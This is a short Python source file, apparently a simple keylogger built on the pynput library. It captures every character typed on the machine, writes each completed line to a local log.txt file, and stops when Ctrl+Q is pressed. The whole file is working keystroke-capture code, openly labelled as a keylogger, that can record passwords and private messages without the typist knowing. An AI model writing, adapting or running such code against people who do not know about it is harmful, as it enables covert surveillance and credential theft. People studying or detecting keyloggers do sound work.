import os
from pynput.keyboard import Key, KeyCode, Listener


#Log file
LOG_DATA = 'log.txt'
curr_line = []
stop_log = {Key.ctrl_l, KeyCode(char='q')}
pressed = set()

#Function to handle key press
def on_press(key):
    global curr_line
    pressed.add(key)
    if(stop_log.issubset(pressed)):
        print("Stopping Keylogger.")
        return False
    try:
        if hasattr(key, 'char') and key.char is not None:
            curr_line.append(key.char)
        elif key == Key.space:
            curr_line.append(' ')
    except AttributeError: 
        with open(LOG_DATA, 'a') as f:
            f.write(f'[{key}]')

#Function to handle key release
def on_release(key):
    global curr_line
    if key in pressed:
        pressed.remove(key)
    #Enter press will log as line and clear curr_line
    if key == Key.enter:
        with open(LOG_DATA, 'a') as f:
            #save line to the log file
            f.write(''.join(curr_line) + '\n')
        curr_line = []

#Start the keylogger
if __name__ == '__main__':
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
